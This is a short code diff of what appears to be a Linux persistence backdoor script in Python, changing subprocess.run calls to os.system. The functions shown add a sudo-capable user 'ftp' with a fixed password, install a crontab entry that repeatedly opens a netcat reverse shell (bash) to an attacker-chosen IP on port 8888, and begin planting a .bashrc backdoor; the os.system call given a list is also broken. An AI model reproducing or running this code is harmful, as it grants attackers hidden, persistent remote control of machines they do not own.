@@ -5,10 +5,10 @@ import sys
 def createSuperUser():
 	username = 'ftp' #switch to fit more likely with something
 	password = 'returnER' #change password if you want
-	subprocess.run(['useradd', '-aG sudo', '-p', password, username])
+	os.system(['useradd', '-aG sudo', '-p', password, username])
 
 def createCronTabBackDoor(ip):
-	subprocess.run(f'(crontab -l ; echo "*/2 * * * * sleep 200 && nc {ip} 8888 -e /bin/bash") | crontab 2> /dev/null')
+	os.system(f'(crontab -l ; echo "*/2 * * * * sleep 200 && nc {ip} 8888 -e /bin/bash") | crontab 2> /dev/null')
 
 def backDoorBashRC():
 	userHomeDirs = os.listdir('/home')
